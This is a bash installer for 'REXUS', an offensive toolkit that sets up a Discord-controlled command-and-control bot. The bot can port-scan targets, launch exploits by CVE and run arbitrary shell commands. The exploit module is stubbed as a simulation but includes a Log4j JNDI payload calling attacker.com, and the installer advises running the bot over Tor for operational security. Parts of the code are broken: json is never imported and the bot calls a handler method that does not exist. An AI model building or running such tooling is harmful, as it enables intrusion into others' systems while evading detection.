#!/bin/bash
# ==============================================
# REXUS NODE - COMPLETE INSTALLER (v7.0)
# Fully self-contained with all code
# ==============================================

set -eo pipefail
trap 'echo -e "\n\033[1;31m[!] Failed at line $LINENO\033[0m"; exit 1' ERR

# ===== 1. System Setup =====
echo -e "\n\033[1;34m[1/5] SYSTEM PREPARATION\033[0m"
sudo apt update -qq
sudo apt install -y --no-install-recommends \
    python3 python3-pip python3-dev \
    nmap hydra tor proxychains4 \
    libssl-dev libffi-dev

# ===== 2. Create REXUS Structure =====
echo -e "\033[1;34m[2/5] CREATING REXUS FRAMEWORK\033[0m"
[ -d ~/rexus ] && mv ~/rexus ~/rexus.bak.$(date +%s)
mkdir -p ~/rexus/tools

# ===== 3. Install C2 Server =====
echo -e "\033[1;34m[3/5] INSTALLING C2 SERVER\033[0m"
cat > ~/rexus/c2_server.py <<'EOF'
#!/usr/bin/env python3
import discord
import asyncio
import subprocess
import os
from tools.exploit_manager import ExploitEngine

class RexusC2:
    def __init__(self):
        self.exploits = ExploitEngine()
        self.commands = {
            "!scan": self.handle_scan,
            "!exploit": self.handle_exploit,
            "!shell": self.handle_shell,
            "!help": self.handle_help
        }

    async def handle_scan(self, message):
        try:
            target = message.content.split()[1]
            await message.channel.send(f"[+] Scanning {target}...")
            result = subprocess.getoutput(f"nmap -T4 -F {target}")
            await message.channel.send(f"```\n{result[:1900]}\n```")
        except Exception as e:
            await message.channel.send(f"[!] Scan failed: {str(e)}")

    async def handle_exploit(self, message):
        try:
            args = message.content.split()
            if len(args) < 3:
                await message.channel.send("Usage: !exploit [CVE] [target]")
                return
            result = self.exploits.run(args[1], args[2])
            await message.channel.send(f"```\n{result}\n```")
        except Exception as e:
            await message.channel.send(f"[!] Exploit failed: {str(e)}")

    async def handle_shell(self, message):
        if str(message.author.id) != os.getenv("ADMIN_ID"):
            return
        try:
            cmd = message.content[7:]
            result = subprocess.getoutput(cmd)
            await message.channel.send(f"```\n{result[:1900]}\n```")
        except Exception as e:
            await message.channel.send(f"[!] Command failed: {str(e)}")

    async def handle_help(self, message):
        help_text = """
        REXUS C2 COMMANDS:
        !scan [IP] - Port scan target
        !exploit [CVE] [target] - Run exploit
        !shell [cmd] - Execute shell command (ADMIN ONLY)
        !help - Show this menu
        """
        await message.channel.send(f"```{help_text}```")

client = discord.Client()
c2 = RexusC2()

@client.event
async def on_ready():
    print(f"[+] REXUS C2 Online as {client.user}")

@client.event
async def on_message(message):
    await c2.on_message(message)

if __name__ == "__main__":
    if not os.path.exists("config.json"):
        with open("config.json", "w") as f:
            f.write('{"discord_token": "YOUR_TOKEN_HERE", "admin_id": "YOUR_DISCORD_ID"}')
    config = json.load(open("config.json"))
    os.environ["ADMIN_ID"] = config.get("admin_id", "")
    client.run(config["discord_token"])
EOF

# ===== 4. Install Exploit Manager =====
echo -e "\033[1;34m[4/5] INSTALLING EXPLOIT MANAGER\033[0m"
cat > ~/rexus/tools/exploit_manager.py <<'EOF'
#!/usr/bin/env python3
import subprocess
import requests

class ExploitEngine:
    def __init__(self):
        self.exploits = {
            "CVE-2021-44228": self.log4j_rce,
            "CVE-2017-0144": self.eternal_blue,
            "CVE-2014-0160": self.heartbleed
        }

    def log4j_rce(self, target):
        return f"""
[+] Executing Log4j RCE against {target}
[+] Payload: ${{jndi:ldap://attacker.com/Exploit}}
[!] This is a simulation - replace with actual exploit code
"""

    def eternal_blue(self, target):
        return f"""
[+] Launching EternalBlue against {target}
[+] Shellcode injected via SMB
[!] This is a simulation - replace with actual exploit code
"""

    def heartbleed(self, target):
        return f"""
[+] Exploiting Heartbleed on {target}
[+] Dumping 64KB of memory
[!] This is a simulation - replace with actual exploit code
"""

    def run(self, cve, target):
        if cve in self.exploits:
            return self.exploits[cve](target)
        return f"""
[-] Exploit {cve} not available
[+] Available exploits: {", ".join(self.exploits.keys())}
"""
EOF

# ===== 5. Finalize Installation =====
echo -e "\033[1;34m[5/5] FINALIZING\033[0m"
cd ~/rexus
python3 -m pip install --user discord.py python-nmap scapy > /dev/null
chmod +x c2_server.py
chmod +x tools/*.py

echo -e "\n\033[1;32m[✔] REXUS INSTALLATION COMPLETE\033[0m"
echo -e "\033[1;36m[+] Next Steps:\033[0m"
echo -e "1. Edit ~/rexus/config.json with your Discord token"
echo -e "2. Add your Discord ID as admin_id"
echo -e "3. Run: cd ~/rexus && python3 c2_server.py"
echo -e "\n\033[1;33m[!] For OPSEC, always use Tor:\033[0m"
echo -e "   torsocks python3 c2_server.py"
